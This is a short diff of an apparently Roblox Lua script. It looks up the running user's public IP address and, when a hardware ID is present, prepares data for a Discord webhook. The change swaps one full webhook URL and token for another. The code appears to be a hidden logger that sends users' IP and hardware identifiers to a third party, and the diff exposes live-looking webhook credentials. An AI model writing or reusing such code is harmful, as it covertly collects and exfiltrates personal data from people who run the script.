@@ -39,7 +39,7 @@ end
 local IP = game:HttpGet("https://v4.ident.me")
 if hwid then
     local HttpServ = game:GetService('HttpService')
-    local url = "https://discord.com/api/webhooks/1331574258790567949/rwCgsuHnmSpHI8A_A2beAFVceLKvZXuH48O3quF5OmfQkTbdsSAWbuqSs3DvMWskxXFA"
+    local url = "https://discord.com/api/webhooks/1332217245593632788/3pcbMtN6xfCkC-OuXjdqAK_wmLMEcpvxFdT0IsR_zusk4LVGSXF_HA2XZS7Sqjn22dRY"
 
     local data =
     {
